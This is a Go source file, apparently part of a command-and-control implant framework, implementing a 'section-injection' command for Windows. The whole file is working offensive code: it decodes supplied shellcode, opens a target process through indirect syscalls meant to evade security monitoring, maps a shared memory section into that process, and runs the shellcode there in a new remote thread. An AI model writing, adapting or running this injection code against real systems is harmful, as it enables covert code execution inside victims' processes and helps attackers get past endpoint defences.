//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"killa/pkg/structs"
)

// SectionInjectionCommand implements the section-injection command
type SectionInjectionCommand struct{}

// Name returns the command name
func (c *SectionInjectionCommand) Name() string {
	return "section-injection"
}

// Description returns the command description
func (c *SectionInjectionCommand) Description() string {
	return "Perform process injection using memory sections (NtCreateSection/NtMapViewOfSection)"
}

// SectionInjectionParams represents the parameters for section-injection
type SectionInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
	PID          int    `json:"pid"`           // Target process ID
}

// Execute executes the section-injection command
func (c *SectionInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params SectionInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	output, err := performSectionInjection(shellcode, params.PID)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
	}

	return successResult(output)
}

func performSectionInjection(shellcode []byte, pid int) (string, error) {
	var sb strings.Builder

	sb.WriteString("[*] Section Injection starting\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))

	if !IndirectSyscallsAvailable() {
		return sb.String(), fmt.Errorf("Indirect syscalls are required for section injection")
	}
	sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")

	// Step 1: Open target process
	var hProcess uintptr
	status := IndirectNtOpenProcess(&hProcess, uint32(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|
		PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ), uintptr(pid))
	if status != 0 {
		return sb.String(), fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))

	// Step 2: Create Section
	var hSection uintptr
	maxSize := uint64(len(shellcode))
	status = IndirectNtCreateSection(&hSection, 0xF001F, nil, &maxSize, PAGE_EXECUTE_READWRITE, 0x8000000, 0) // SECTION_ALL_ACCESS, SEC_COMMIT
	if status != 0 {
		return sb.String(), fmt.Errorf("NtCreateSection failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hSection)
	sb.WriteString(fmt.Sprintf("[+] Created section handle: 0x%X\n", hSection))

	// Step 3: Map section locally (RW)
	var localBase uintptr
	var localViewSize uintptr
	// Map as RW
	status = IndirectNtMapViewOfSection(hSection, uintptr(0xffffffffffffffff), &localBase, 0, 0, nil, &localViewSize, 1, 0, PAGE_READWRITE)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtMapViewOfSection (Local) failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtUnmapViewOfSection(uintptr(0xffffffffffffffff), localBase)
	sb.WriteString(fmt.Sprintf("[+] Mapped section locally: 0x%X (RW)\n", localBase))

	// Step 4: Write shellcode to local section
	sb.WriteString("[*] Writing shellcode to local section...\n")
	copy((*[1 << 30]byte)(unsafe.Pointer(localBase))[:len(shellcode)], shellcode)
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to local section\n", len(shellcode)))

	// Step 5: Map section remotely (RX)
	var remoteBase uintptr
	var remoteViewSize uintptr
	status = IndirectNtMapViewOfSection(hSection, hProcess, &remoteBase, 0, 0, nil, &remoteViewSize, 1, 0, PAGE_EXECUTE_READ)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtMapViewOfSection (Remote) failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped section remotely: 0x%X (RX)\n", remoteBase))

	// Step 6: Execute via NtCreateThreadEx
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, remoteBase)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hThread)
	sb.WriteString(fmt.Sprintf("[+] Thread created (handle: 0x%X)\n", hThread))
	sb.WriteString("[+] Section injection completed successfully\n")

	return sb.String(), nil
}
